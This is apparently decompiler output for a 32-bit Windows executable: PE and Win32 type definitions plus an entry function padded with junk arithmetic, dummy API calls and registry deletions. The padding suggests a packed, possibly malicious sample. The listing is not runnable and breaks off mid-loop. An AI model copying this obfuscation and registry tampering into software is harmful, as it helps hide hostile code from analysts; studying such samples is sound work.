typedef struct _CERT_SIMPLE_CHAIN _CERT_SIMPLE_CHAIN, *P_CERT_SIMPLE_CHAIN;

typedef struct _CERT_SIMPLE_CHAIN *PCERT_SIMPLE_CHAIN;

typedef struct _CERT_CHAIN_ELEMENT *PCERT_CHAIN_ELEMENT;

typedef struct _CERT_TRUST_LIST_INFO _CERT_TRUST_LIST_INFO, *P_CERT_TRUST_LIST_INFO;

typedef struct _CERT_TRUST_LIST_INFO *PCERT_TRUST_LIST_INFO;

typedef CTL_CONTEXT *PCCTL_CONTEXT;

struct _CERT_TRUST_LIST_INFO {
    DWORD cbSize;
    PCTL_ENTRY pCtlEntry;
    PCCTL_CONTEXT pCtlContext;
};

struct _CERT_SIMPLE_CHAIN {
    DWORD cbSize;
    CERT_TRUST_STATUS TrustStatus;
    DWORD cElement;
    PCERT_CHAIN_ELEMENT *rgpElement;
    PCERT_TRUST_LIST_INFO pTrustListInfo;
    BOOL fHasRevocationFreshnessTime;
    DWORD dwRevocationFreshnessTime;
};

typedef struct _CERT_CHAIN_CONTEXT _CERT_CHAIN_CONTEXT, *P_CERT_CHAIN_CONTEXT;

typedef struct _CERT_CHAIN_CONTEXT CERT_CHAIN_CONTEXT;

typedef CERT_CHAIN_CONTEXT *PCCERT_CHAIN_CONTEXT;

struct _CERT_CHAIN_CONTEXT {
    DWORD cbSize;
    CERT_TRUST_STATUS TrustStatus;
    DWORD cChain;
    PCERT_SIMPLE_CHAIN *rgpChain;
    DWORD cLowerQualityChainContext;
    PCCERT_CHAIN_CONTEXT *rgpLowerQualityChainContext;
    BOOL fHasRevocationFreshnessTime;
    DWORD dwRevocationFreshnessTime;
    DWORD dwCreateFlags;
    GUID ChainId;
};

typedef struct _CRYPT_ATTRIBUTE CRYPT_ATTRIBUTE;

typedef BOOL (*PFN_CERT_CREATE_CONTEXT_SORT_FUNC)(DWORD, DWORD, DWORD, void *);

typedef struct _CERT_CREATE_CONTEXT_PARA _CERT_CREATE_CONTEXT_PARA, *P_CERT_CREATE_CONTEXT_PARA;

typedef void (*PFN_CRYPT_FREE)(LPVOID);

struct _CERT_CREATE_CONTEXT_PARA {
    DWORD cbSize;
    PFN_CRYPT_FREE pfnFree;
    void *pvFree;
    PFN_CERT_CREATE_CONTEXT_SORT_FUNC pfnSort;
    void *pvSort;
};

typedef struct _CERT_CREATE_CONTEXT_PARA *PCERT_CREATE_CONTEXT_PARA;

typedef uchar *LPBYTE;

typedef struct tagPOINT *LPPOINT;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HPEN__ HPEN__, *PHPEN__;

typedef struct HPEN__ *HPEN;

struct HPEN__ {
    int unused;
};

typedef struct HDC__ HDC__, *PHDC__;

struct HDC__ {
    int unused;
};

typedef struct tagSIZE tagSIZE, *PtagSIZE;

typedef struct tagSIZE SIZE;

struct tagSIZE {
    LONG cx;
    LONG cy;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;


// WARNING! conflicting data type names: /WinDef.h/LPBYTE - /mapi.h/LPBYTE

typedef struct HDESK__ HDESK__, *PHDESK__;

struct HDESK__ {
    int unused;
};

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef int (*FARPROC)(void);

typedef struct HDC__ *HDC;

typedef struct HICON__ HICON__, *PHICON__;

struct HICON__ {
    int unused;
};

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef WORD *LPWORD;

typedef WORD ATOM;

typedef struct HWINSTA__ HWINSTA__, *PHWINSTA__;

struct HWINSTA__ {
    int unused;
};

typedef struct HWINSTA__ *HWINSTA;

typedef struct HICON__ *HICON;

typedef struct HRSRC__ *HRSRC;

typedef struct HENHMETAFILE__ HENHMETAFILE__, *PHENHMETAFILE__;

struct HENHMETAFILE__ {
    int unused;
};

typedef struct HENHMETAFILE__ *HENHMETAFILE;

typedef HICON HCURSOR;

typedef struct HDESK__ *HDESK;

typedef DWORD COLORREF;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_30 IMAGE_RESOURCE_DIR_STRING_U_30, *PIMAGE_RESOURCE_DIR_STRING_U_30;

struct IMAGE_RESOURCE_DIR_STRING_U_30 {
    word Length;
    wchar16 NameString[15];
};

typedef struct IMAGE_DEBUG_DIRECTORY IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;

struct IMAGE_DEBUG_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword Type;
    dword SizeOfData;
    dword AddressOfRawData;
    dword PointerToRawData;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_12 IMAGE_RESOURCE_DIR_STRING_U_12, *PIMAGE_RESOURCE_DIR_STRING_U_12;

struct IMAGE_RESOURCE_DIR_STRING_U_12 {
    word Length;
    wchar16 NameString[6];
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_28 IMAGE_RESOURCE_DIR_STRING_U_28, *PIMAGE_RESOURCE_DIR_STRING_U_28;

struct IMAGE_RESOURCE_DIR_STRING_U_28 {
    word Length;
    wchar16 NameString[14];
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_24 IMAGE_RESOURCE_DIR_STRING_U_24, *PIMAGE_RESOURCE_DIR_STRING_U_24;

struct IMAGE_RESOURCE_DIR_STRING_U_24 {
    word Length;
    wchar16 NameString[12];
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;

typedef struct _SHFILEINFOW _SHFILEINFOW, *P_SHFILEINFOW;

typedef struct _SHFILEINFOW SHFILEINFOW;

struct _SHFILEINFOW {
    HICON hIcon;
    int iIcon;
    DWORD dwAttributes;
    WCHAR szDisplayName[260];
    WCHAR szTypeName[80];
};




// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x00403295) overlaps instruction at (ram,0x00403294)
// 
// WARNING: Removing unreachable block (ram,0x004030ea)
// WARNING: Removing unreachable block (ram,0x004032b5)
// WARNING: Removing unreachable block (ram,0x00404ade)
// WARNING: Removing unreachable block (ram,0x00404ce7)
// WARNING: Removing unreachable block (ram,0x00403244)
// WARNING: Removing unreachable block (ram,0x0040321f)
// WARNING: Removing unreachable block (ram,0x004030cb)
// WARNING: Removing unreachable block (ram,0x004030f4)
// WARNING: Removing unreachable block (ram,0x00403116)
// WARNING: Removing unreachable block (ram,0x00403123)
// WARNING: Removing unreachable block (ram,0x0040312b)
// WARNING: Removing unreachable block (ram,0x00403138)
// WARNING: Removing unreachable block (ram,0x00403153)
// WARNING: Removing unreachable block (ram,0x00403159)
// WARNING: Removing unreachable block (ram,0x00403169)
// WARNING: Removing unreachable block (ram,0x0040316f)
// WARNING: Removing unreachable block (ram,0x00404dfa)
// WARNING: Removing unreachable block (ram,0x00404e2d)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint entry(void)

{
  code *pcVar1;
  bool bVar2;
  SHORT SVar3;
  HMENU pHVar4;
  uint uVar5;
  int iVar6;
  HRESULT HVar7;
  DWORD DVar8;
  undefined3 extraout_var;
  UINT UVar9;
  undefined2 extraout_var_02;
  undefined3 extraout_var_00;
  HCURSOR pHVar10;
  LSTATUS LVar11;
  COLORREF CVar12;
  HWND pHVar13;
  undefined3 extraout_var_01;
  uint extraout_ECX;
  void *this;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  void *this_00;
  uint extraout_ECX_03;
  uint extraout_ECX_04;
  undefined4 extraout_ECX_05;
  int extraout_EDX;
  int extraout_EDX_00;
  int extraout_EDX_01;
  int extraout_EDX_02;
  int extraout_EDX_03;
  int extraout_EDX_04;
  int extraout_EDX_05;
  int extraout_EDX_06;
  int extraout_EDX_07;
  int extraout_EDX_08;
  int extraout_EDX_09;
  undefined4 extraout_EDX_10;
  byte bVar14;
  byte bVar15;
  uint uVar16;
  int iVar17;
  undefined4 *puVar18;
  int iVar19;
  byte in_AF;
  undefined8 uVar20;
  ulonglong uVar21;
  undefined unaff_retaddr;
  undefined in_stack_00000004;
  undefined in_stack_00000008;
  undefined in_stack_0000000c;
  undefined1 in_stack_0000007d;
  undefined1 in_stack_0000008d;
  undefined uVar22;
  undefined uVar23;
  uint uVar24;
  undefined uVar25;
  
  DAT_0040c684 = 0;
  pHVar4 = LoadMenuW((HINSTANCE)0x0,(LPCWSTR)0x0);
  DAT_0040c27b = 0;
  DAT_0040c00e = 0;
  _DAT_0040c8ec = LoadMenuW((HINSTANCE)0x0,(LPCWSTR)0x0);
  _DAT_0040c460 = _DAT_0040c460 + -0x970;
  bVar15 = DAT_0040c3df ^ 0x4a;
  _DAT_0040c6e5 = CONCAT31((undefined3)uRam0040c3e0,DAT_0040c3df) + 0x403;
  if (_DAT_0040c6e5 != 0) {
    _DAT_0040c6e5 = CONCAT31((undefined3)uRam0040c3e0,DAT_0040c3df) + 0x404;
  }
  _DAT_0040c6e5 = _DAT_0040c6e5 >> 1;
  uVar25 = 0;
  uVar22 = 0x2e;
  uVar24 = 0x12e;
  iVar19 = -0x842;
  bVar14 = (byte)_DAT_0040c6e5 | 100;
  _DAT_0040c882 = _DAT_0040c6e5;
  uVar21 = FUN_00403644(0xfe,0xa8198a0f,0,DAT_0040c72b);
  uVar5 = (uint)uVar21 >> 1;
  if ((uVar24 & uVar5) == 0) {
    iVar19 = 0x20bb;
    uVar5 = uVar5 + 0x20bb;
  }
  iVar6 = (uVar5 << 8 | uVar5 >> 0x18) + 0x7fc;
  if (iVar6 == 0) {
    iVar19 = 0xa69;
    iVar6 = 0xa69;
  }
  if ((iVar6 - 0x113bU | _DAT_0040ca83) != 0) {
    bVar14 = 0xef;
  }
  RegOpenKeyExA((HKEY)0x80000002,(LPCSTR)0x0,0,0xf003f,(PHKEY)0x0);
  FUN_00403833(&DAT_0040c2a0,0);
  FUN_004039d6(0xde,(char)(iVar19 + 0x113a),iVar19 + 0x113a,0x699c);
  FUN_0040338f(CONCAT22(DAT_0040c966._2_2_,(undefined2)DAT_0040c966),&DAT_0040c839,DAT_0040c43a,0x43
               ,bVar15,uVar22,bVar14,uVar25,unaff_retaddr,in_stack_00000004,in_stack_0000008d);
  GetDC((HWND)0x0);
  _DAT_0040c8af = 0x13a9;
  iVar19 = CONCAT31((undefined3)uRam0040cba0,DAT_0040cb9c._3_1_) + -0x13a9;
  DAT_0040cb9c._3_1_ = (undefined)iVar19;
  uRam0040cba0._0_3_ = (undefined3)((uint)iVar19 >> 8);
  FUN_00403a4c(this,0x40c530);
  uVar5 = 0xb76b52a;
  DAT_0040c14e = 0;
  HVar7 = SHGetDataFromIDListA
                    ((IShellFolder *)0x0,(LPCITEMIDLIST)0x0,0xb76b52a,(void *)0x2466a54b,0x4ae634c);
  iVar19 = extraout_EDX_00;
  if (HVar7 == 0) goto LAB_00403227;
  _DAT_0040c4d9 = _DAT_0040c4d9 - (HVar7 + -1);
  DVar8 = SuspendThread((HANDLE)0x5);
  iVar19 = extraout_EDX_01;
  if (DVar8 != 0xffffffff) goto LAB_00403227;
  bVar2 = FUN_00403b85(0);
  _DAT_0040cada = CONCAT31(extraout_var,bVar2);
  uVar24 = _DAT_0040cada + 1;
  uVar5 = uVar5 | uVar24;
  if (uVar5 == 0) {
    uVar24 = ((uVar24 & 0xffffff) - _DAT_0040ca0e) + _DAT_0040c9a0;
  }
  _DAT_0040c022 = uVar24 + 0x9dc;
  if (_DAT_0040c022 != 0) {
    _DAT_0040c022 = 0x276f5;
  }
  _DAT_0040c022 = _DAT_0040c022 + 0x727;
  DAT_0040cb61 = 0;
  UVar9 = RegisterWindowMessageA((LPCSTR)0x0);
  _DAT_0040c944 = UVar9 - ram0x0040c996;
  if (_DAT_0040c944 == 0x981) {
    _DAT_0040c944 = -0x7ffffb40;
  }
  _DAT_0040c944 = _DAT_0040c944 + 1;
  iVar19 = StartPage((HDC)0x9);
  if (iVar19 != -1) goto LAB_0040317d;
  iVar19 = _DAT_0040ccd4 + -0x2d;
  if (iVar19 != 0) {
    iVar19 = _DAT_0040ccd4 + -0x1775;
  }
  _DAT_0040c098 = _DAT_0040c098 - iVar19;
  iVar6 = (iVar19 - _DAT_0040cccb) + 0xc9;
  if (iVar6 == 0) {
    iVar6 = ((iVar19 - _DAT_0040cccb) + 0x1614) * 0x100;
  }
  uVar24 = 3;
  DVar8 = SuspendThread((HANDLE)0x3);
  iVar19 = extraout_EDX_02;
  if (DVar8 != 0xffffffff) goto LAB_00403227;
  FUN_00403323(&DAT_0040c8f6);
  DAT_0040cc25 = 0;
  SVar3 = GetKeyState(0);
  if (CONCAT22(extraout_var_02,SVar3) == 0) {
    FUN_00403909(0x40c4bd);
    iVar19 = 3;
    uVar16 = 0xafb;
    if ((uVar5 & 0xafb) == 0) {
      uVar16 = _DAT_0040c514 + 0xb7b52;
    }
    _DAT_0040c425 = _DAT_0040c425 + (uVar16 & 0xf);
    uVar5 = 9;
    DVar8 = GetFontUnicodeRanges((HDC)0x9,(LPGLYPHSET)0x24);
    if (DVar8 == 0) {
      bVar2 = FUN_00403b85(&DAT_0040c5ef);
      _DAT_0040c700 = CONCAT31(extraout_var_00,bVar2) + 0x533;
      if ((uVar5 | _DAT_0040c700) == 0) {
        iVar19 = 0x1ce8;
        _DAT_0040c700 = (_DAT_0040c700 + _DAT_0040c7ec + -0x1ce8) - _DAT_0040c61b;
      }
      _DAT_0040c700 = _DAT_0040c700 + 0x29d;
      iVar6 = (_DAT_0040c700 >> 2 | _DAT_0040c700 * 0x40000000) + 0x4be;
      if (iVar6 == 0) {
        iVar6 = 0;
      }
      _DAT_0040cc5d = _DAT_0040cc5d + iVar6;
      uVar5 = GetTextCharset((HDC)0x9);
      if (uVar5 != 0) {
        uVar24 = iVar19 - (uVar5 | _DAT_0042f161);
        FUN_00403909(0x532);
        UVar9 = SetSystemPaletteUse((HDC)0x3,3);
        if (UVar9 != 0) goto LAB_004031c8;
        _DAT_0040c8a2 = 1;
        DVar8 = GetFontUnicodeRanges((HDC)0x3,(LPGLYPHSET)0x6d);
        uVar5 = extraout_ECX_00;
        iVar19 = extraout_EDX_03;
        if (DVar8 != 0) goto LAB_00403299;
        _DAT_0040c3dc = 0x76;
        pHVar10 = LoadCursorA((HINSTANCE)0x0,(LPCSTR)0x0);
        uVar5 = extraout_ECX_01;
        iVar19 = extraout_EDX_04;
        if (pHVar10 != (HCURSOR)0x0) goto LAB_00403299;
        FUN_00403644(extraout_ECX_01,extraout_EDX_04,0,0);
        uVar23 = 199;
        _DAT_0040c990 = _DAT_0040c990 & 0xffffff;
        DAT_0040c993._1_2_ = 0;
        ram0x0040c996 = ram0x0040c996 & 0xffffff00;
        HVar7 = SHGetDataFromIDListA
                          ((IShellFolder *)0x0,(LPCITEMIDLIST)0x0,0xe5a24c7,(void *)0x2d55960d,
                           0x79ec9a6a);
        iVar19 = extraout_EDX_05;
        if (HVar7 == 0) goto LAB_00403227;
        iVar19 = FUN_00403f04((char)DAT_0040cb9c,(char)DAT_0040cc61,bVar15,uVar22,uVar23,uVar25,
                              unaff_retaddr,in_stack_00000004,in_stack_00000008,in_stack_0000000c,
                              in_stack_0000007d);
        if (iVar19 != 0) {
          LVar11 = RegDeleteValueA((HKEY)0x0,&DAT_0040c90d);
          iVar19 = extraout_EDX_06;
          if (LVar11 == 0) goto LAB_00403227;
          FUN_00403526(DAT_0040c3bb);
          LVar11 = RegDeleteValueA((HKEY)0x0,&DAT_0040c3f3);
          if (LVar11 != 0) {
            FUN_00403833(0,0xe711);
            _DAT_0040c3a7 = _DAT_0040c3a7 & 0xff;
            DAT_0040c3a8._3_1_ = 0;
            HVar7 = SHGetDataFromIDListA
                              ((IShellFolder *)0x0,(LPCITEMIDLIST)0x0,0x185cdf3d,(void *)0x145f0ff4,
                               0x70116c8);
            uVar5 = extraout_ECX_02;
            iVar19 = extraout_EDX_07;
            if (HVar7 == 0) goto LAB_00403299;
            iVar19 = HVar7 - CONCAT31((undefined3)uRam0040cb05,DAT_0040cb04);
            iVar6 = iVar19 + -0xc16;
            if (iVar6 == 0) {
              iVar6 = (iVar19 + -0xc17) * 2;
            }
            _DAT_0040c112 = _DAT_0040c112 - iVar6;
            FUN_00403c11();
            uVar24 = 7;
            CVar12 = GetTextColor((HDC)0x7);
            if (CVar12 != 0xffffffff) goto LAB_004031c8;
            FUN_00403b85(0xe6b9);
            _DAT_0040c748 = 0x8c5 - _DAT_0040cc2c;
            _DAT_0040cdd8 = _DAT_0040cdd8 + _DAT_0040c748 * -2;
            DAT_0040c4cf = 0;
            SHGetDataFromIDListA
                      ((IShellFolder *)0x0,(LPCITEMIDLIST)0x0,0x47b231b5,(void *)0x7297264,
                       0x7c34bbac);
            FUN_00403a4c(this_00,0x7c34bbac);
            pHVar13 = GetActiveWindow();
            if (pHVar13 == (HWND)0x0) {
              uVar5 = (int)&stack0xfffffffc * 2 + 0x7c34e02f + _DAT_0040c573;
              if (uVar5 != 0x326) {
                uVar5 = uVar5 + 0x67e;
              }
              _DAT_0040c989 = uVar5 >> 1 | (uint)((uVar5 & 1) != 0) << 0x1f;
              _DAT_0040caf8 = (uVar5 >> 1) << 7 | _DAT_0040c989 >> 0x19;
              bVar2 = FUN_00403b85(&DAT_0040c875);
              _DAT_0040cb56 = _DAT_0040cb56 + (CONCAT31(extraout_var_01,bVar2) | 0x2136);
              CVar12 = GetTextColor((HDC)0x5);
              uVar5 = extraout_ECX_03;
              iVar19 = extraout_EDX_08;
              if (CVar12 != 0xffffffff) goto LAB_00403299;
              iVar19 = 0x470;
              if ((_DAT_0040c508 & 0x470) == 0) {
                iVar19 = 0x25a;
              }
              _DAT_0040c4e0 = _DAT_0040c4e0 - iVar19;
              _DAT_0040c874 = _DAT_0040c38f;
              if (_DAT_0040c38f == 0) {
                _DAT_0040c874 = _DAT_0040c91c >> 7;
              }
              _DAT_0040cd2b = 0x28be08;
              uVar24 = 0;
              LVar11 = RegEnumValueA((HKEY)0x0,0xf5,&DAT_0040c82e,(LPDWORD)&DAT_0040c79a,
                                     (LPDWORD)0x0,(LPDWORD)&DAT_0040c437,&DAT_0040c5d1,
                                     (LPDWORD)0x1969fff);
              uVar5 = extraout_ECX_04;
              iVar19 = extraout_EDX_09;
              if (LVar11 == 0) goto LAB_00403299;
              FUN_00404375(extraout_ECX_04);
              iVar19 = 0x12e38;
              if ((uVar24 & 0x12e38) == 0) {
                iVar19 = 0x25c70;
              }
              _DAT_0040cac7 = _DAT_0040cac7 - (iVar19 + -1);
              _DAT_0040cbb4 = 0x2463;
              uVar5 = _DAT_0040cbb4;
              uVar24 = FUN_004036b6(0x16ca,0x2463);
              _DAT_0040c990 = -_DAT_0040cd00;
              if ((uVar5 & _DAT_0040c990) != 0) {
                uVar24 = _DAT_0040c990 ^ 0x11ca;
                _DAT_0040c990 = (_DAT_0040c990 - _DAT_0040c902) + 0x5ec;
              }
              _DAT_0040c3a7 = _DAT_0040c3a7 - _DAT_0040c990;
              uVar5 = uVar24 << 6 | uVar24 >> 0x1a | _DAT_0040c42a;
              if (uVar5 == 0) {
                uVar5 = 0x6d2;
              }
              uVar24 = 0x800005d9;
              if ((uVar5 | 0x800005d9) != 0) {
                uVar24 = 0x4c5f0;
              }
              uVar24 = (uVar24 | 0x24db) + 0x41c;
              if (((uVar5 | 0x800005d9) & uVar24) == 0) {
                uVar24 = uVar24 >> 4;
              }
              _DAT_0040c7f4 = _DAT_0040c7f4 - uVar24;
              uVar21 = FUN_00403644(extraout_ECX_05,extraout_EDX_10,0x32,DAT_0040c239);
              _DAT_0040cdb6 = _DAT_0040cdb6 + -0x11eb7;
              return (uint)uVar21 >> 1 | (uint)((uVar21 & 1) != 0) << 0x1f;
            }
          }
        }
      }
      goto LAB_0040317d;
    }
  }
  else {
LAB_0040317d:
    uVar24 = 0;
    _DAT_0040c3d5 = 0;
    _DAT_0040cb01 = 0;
    FUN_00403179();
  }
LAB_004031c8:
  _DAT_0040c263 = uVar24 | 0x106c;
  _DAT_0040c076 = 0xa000006b;
  if ((_DAT_0040cdf9 & 0xa000006b) == 0) {
    _DAT_0040c076 = 0x3851;
  }
  _DAT_0040c076 = _DAT_0040c076 | 0xc8c;
  if (_DAT_0040c076 != 0) {
    _DAT_0040c076 = (_DAT_0040c076 >> 4 & 0xfff) + _DAT_0040c9b1;
  }
  _DAT_0040ca34 = _DAT_0040c076;
  uVar20 = FUN_004031c2();
  iVar19 = (int)((ulonglong)uVar20 >> 0x20);
LAB_00403227:
  uVar24 = 0xa9d;
  iVar6 = 0x15cb;
  uVar16 = 0x1e7d;
  _DAT_0040c287 = (char *)0x1937;
  bVar2 = (_DAT_0040c09f & 0x1937) == 0;
  if (bVar2) {
    _DAT_0040c287 = &DAT_80000c9b;
  }
  if ((POPCOUNT(_DAT_0040c09f & 0x37) & 1U) != 0) {
    iVar19 = 0x61443b30 - (uint)bVar2;
    in_AF = 9 < ((byte)iVar19 & 0xf) | in_AF;
    bVar15 = (byte)iVar19 + in_AF * -6;
    if (-1 < iVar19) {
      return CONCAT31((int3)((uint)iVar19 >> 8),
                      bVar15 + (0x9f < bVar15 | in_AF * (bVar15 < 6) | 1) * -0x60);
    }
    _DAT_000015ff = &stack0xfffffffc + (int)_DAT_000015ff;
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  DAT_01000a84 = (DAT_01000a84 + '\x17') - bVar2;
  *_DAT_0040c287 = *_DAT_0040c287 + '\n';
  do {
    iVar17 = (iVar6 - _DAT_0040c7df) + -0xda6;
    if (iVar17 == 0) {
      uVar16 = 0x791;
      iVar17 = (iVar6 - _DAT_0040c7df) + -0x615;
    }
    puVar18 = (undefined4 *)(iVar17 << 1 | (uint)(iVar17 < 0));
    iVar6 = CONCAT22((undefined2)DAT_0040c966,_DAT_0040c964) - (int)puVar18;
    _DAT_0040c964 = (undefined2)iVar6;
    DAT_0040c966._0_2_ = (undefined2)((uint)iVar6 >> 0x10);
    uVar5 = uVar24 - 1;
    pcVar1 = (code *)swi(4);
    if (SBORROW4(uVar24,1) == true) {
      (*pcVar1)();
      iVar6 = CONCAT22((undefined2)DAT_0040c966,_DAT_0040c964);
      uVar5 = extraout_ECX;
      iVar19 = extraout_EDX;
    }
    DAT_0040c966._0_2_ = (undefined2)((uint)iVar6 >> 0x10);
    _DAT_0040c964 = (undefined2)iVar6;
